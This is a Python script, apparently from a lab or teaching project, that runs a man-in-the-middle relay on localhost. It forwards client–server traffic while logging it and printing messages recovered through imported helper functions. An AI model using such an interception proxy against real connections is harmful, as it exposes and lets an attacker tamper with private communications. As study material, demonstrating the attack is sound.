import sys
import os
import socket
import threading

sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from man_in_the_middle_attack.helpers import *


HOST = "localhost"  # MITM server
CLIENT_PORT = 65432  # Port to listen for the client
SERVER_PORT = 65433  # Port to forward to the actual server

# Function to handle communication from client to server
def client_to_server(client_conn, server_conn):
    try:
        while True:
            client_data = client_conn.recv(8096)

            if not client_data:
                break
            print("[MITM] Received from client:", client_data[:20] + b'...')

            server_conn.sendall(client_data)

            check_file()
            message = parse_logs()
            decoded_message = message.decode('utf-8')
            if decoded_message:
                print("Decrypted Message: ", decoded_message)

                if decoded_message == 'quit':
                    print("[MITM] Received 'quit' message. Closing connections.")
                    client_conn.close()
                    server_conn.close()
                    break
    except Exception as e:
        print("[MITM] Error in client-to-server:", e)


# Function to handle communication from server to client
def server_to_client(client_conn, server_conn):
    try:
        while True:
            server_data = server_conn.recv(8096)
            if not server_data:
                break
            print("[MITM] Received from server:", server_data[:20] + b'...')
            
            # Forward to client
            client_conn.sendall(server_data)
    except Exception as e:
        print("[MITM] Error in server-to-client:", e)


# Main MITM logic
def mitm():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.bind((HOST, CLIENT_PORT))
        listener.listen()
        print(f"[MITM] Listening for client on port {CLIENT_PORT}...")

        client_conn, client_addr = listener.accept()
        print(f"[MITM] Connected to client at {client_addr}")

        # Connect to the real server
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_conn:
            server_conn.connect((HOST, SERVER_PORT))
            print(f"[MITM] Connected to real server at port {SERVER_PORT}")

            check_logs(b"")

            # Start threads for bi-directional communication
            client_thread = threading.Thread(target=client_to_server, args=(client_conn, server_conn), daemon=True)
            server_thread = threading.Thread(target=server_to_client, args=(client_conn, server_conn), daemon=True)
            
            client_thread.start()
            server_thread.start()

            # Keep the main thread running while child threads handle communication
            client_thread.join()
            server_thread.join()

if __name__ == "__main__":
    mitm()
